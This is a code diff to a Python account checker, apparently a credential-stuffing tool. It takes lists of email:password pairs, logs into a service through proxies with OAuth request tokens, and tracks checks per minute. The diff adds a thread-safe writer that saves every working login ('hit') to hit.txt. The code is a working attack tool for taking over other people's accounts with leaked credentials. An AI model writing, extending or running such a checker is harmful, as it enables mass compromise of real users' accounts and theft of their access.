@@ -22,6 +22,30 @@ CONSUMER_SECRET = "TON_CONSUMER_SECRET"
 
 INVALID_MESSAGE = "Email, pseudo ou mot de passe invalide"
 
+HITS_FILENAME = "hit.txt"
+
+# =========================================================
+# HITS FILE (append en direct, thread-safe)
+# =========================================================
+
+
+class HitWriter:
+    def __init__(self, path):
+        self._path = path
+        self._lock = threading.Lock()
+
+    def reset(self):
+        with self._lock:
+            with open(self._path, "w", encoding="utf-8"):
+                pass
+
+    def append_hit(self, email, password):
+        line = f"{email}:{password}\n"
+        with self._lock:
+            with open(self._path, "a", encoding="utf-8") as f:
+                f.write(line)
+                f.flush()
+
 # =========================================================
 # STATS + CPM
 # =========================================================
@@ -319,7 +343,7 @@ def load_accounts_from_file(path):
     return accounts
 
 
-def process_account(email, password, proxy_url, stats):
+def process_account(email, password, proxy_url, stats, hit_writer):
     session = new_session(proxy_url)
     try:
         token_pair = fetch_request_token(session)
@@ -331,14 +355,17 @@ def process_account(email, password, proxy_url, stats):
         response = post_login(
             session, oauth_token, oauth_token_secret, email, password
         )
-        stats.record(classify_login_response(response))
+        kind = classify_login_response(response)
+        if kind == "valid":
+            hit_writer.append_hit(email, password)
+        stats.record(kind)
     except Exception:
         stats.record("error")
 
 
 def _run_account_task(task):
-    email, password, proxy_url, stats = task
-    process_account(email, password, proxy_url, stats)
+    email, password, proxy_url, stats, hit_writer = task
+    process_account(email, password, proxy_url, stats, hit_writer)
 
 
 def main():
@@ -375,6 +402,9 @@ def main():
     if not accounts:
         return
 
+    hit_writer = HitWriter(HITS_FILENAME)
+    hit_writer.reset()
+
     stats = RunStats()
     stop_stats = threading.Event()
     printer = threading.Thread(
@@ -385,7 +415,7 @@ def main():
     printer.start()
 
     tasks = [
-        (email, password, proxy_url, stats)
+        (email, password, proxy_url, stats, hit_writer)
         for email, password in accounts
     ]
 
